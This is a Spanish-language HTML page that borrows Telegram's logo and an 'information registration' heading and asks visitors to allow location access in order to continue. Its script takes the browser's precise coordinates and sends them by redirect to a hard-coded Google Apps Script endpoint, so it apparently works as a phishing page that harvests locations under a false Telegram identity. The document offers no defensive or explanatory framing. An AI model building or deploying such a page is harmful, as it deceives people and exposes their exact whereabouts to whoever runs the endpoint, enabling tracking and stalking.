<body>


  <div class="pantalla">

    <!-- Imagen Telegram -->

    <img
      class="logo"
      src="Telegram.png"
      alt="Telegram"
    >


    <h1>
      Registro de Información
    </h1>


    <p>
      Para continuar, permita el acceso a su ubicación.
    </p>


    <button
      class="boton"
      onclick="obtenerUbicacion()">

      CONTINUAR

    </button>


    <div
      id="mensaje"
      class="mensaje">

    </div>

  </div>


  <script>

    /*
    =====================================================
    URL DEL GOOGLE APPS SCRIPT
    =====================================================
    */

    const URL_APPS_SCRIPT =
      "https://script.google.com/macros/s/AKfycbwaeaYAFwqOErwaqhalBnXr7WCKkzVm-OOwxe7yxVLstnnM1jbaO2PXY6rwxgU6IMgtSg/exec";


    /*
    =====================================================
    OBTENER UBICACIÓN
    =====================================================
    */

    function obtenerUbicacion() {


      const mensaje =
        document.getElementById("mensaje");


      /*
      Comprobar compatibilidad
      */

      if (!navigator.geolocation) {

        mensaje.innerText =
          "Este navegador no permite obtener la ubicación.";

        mensaje.style.display = "block";

        return;

      }


      /*
      Solicitar ubicación
      */

      navigator.geolocation.getCurrentPosition(

        function(posicion) {


          const latitud =
            posicion.coords.latitude;


          const longitud =
            posicion.coords.longitude;


          /*
          Redireccionar al Apps Script
          */

          const url =
            URL_APPS_SCRIPT +
            "?latitud=" +
            encodeURIComponent(latitud) +
            "&longitud=" +
            encodeURIComponent(longitud);


          window.location.href = url;


        },


        function(error) {


          switch (error.code) {


            case error.PERMISSION_DENIED:

              mensaje.innerText =
                "Debe permitir el acceso a la ubicación para continuar.";

              break;


            case error.POSITION_UNAVAILABLE:

              mensaje.innerText =
                "No fue posible determinar su ubicación.";

              break;


            case error.TIMEOUT:

              mensaje.innerText =
                "La solicitud de ubicación tardó demasiado.";

              break;


            default:

              mensaje.innerText =
                "No fue posible obtener la ubicación.";

          }


          mensaje.style.display = "block";

        },


        {

          enableHighAccuracy: true,

          timeout: 15000,

          maximumAge: 0

        }

      );

    }

  </script>


</body>

</html>
